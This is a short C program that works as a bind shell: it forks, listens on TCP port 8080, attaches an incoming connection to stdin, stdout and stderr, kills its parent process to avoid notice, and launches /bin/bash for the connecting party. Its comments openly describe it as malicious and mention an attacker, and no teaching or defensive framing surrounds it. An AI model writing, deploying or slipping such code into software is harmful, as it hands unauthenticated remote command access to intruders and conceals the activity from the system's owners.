#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <stdio.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/wait.h>

int main() {

    pid_t pid = fork();

    if (pid == 0) {

        // init socket
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in serveraddr;

        // config address and port
        serveraddr.sin_family = AF_INET;
        serveraddr.sin_port = htons(8080);
        serveraddr.sin_addr.s_addr = INADDR_ANY;

        // bind socket
        bind(sock, (struct sockaddr*)&serveraddr, sizeof(serveraddr));

        // listen
        listen(sock, 5);

        // accept
        int client_sock = accept(sock, NULL, NULL);

        // duplicate stdin, stdout and stderr to connected socket
        dup2(client_sock, 0);
        dup2(client_sock, 1);
        dup2(client_sock, 2);

        // define arguments
        char* const args[] = {"/bin/bash", NULL};

        // kill parent process so the malicious stuff is not happening in front of server's eyes
        kill(getppid(), 9);

        // execute bash
        execvp("/bin/bash", args);
        
        // after attacker is done, kill this process
        kill(getpid(), 9);

    } else wait(0);

    return 0;
}
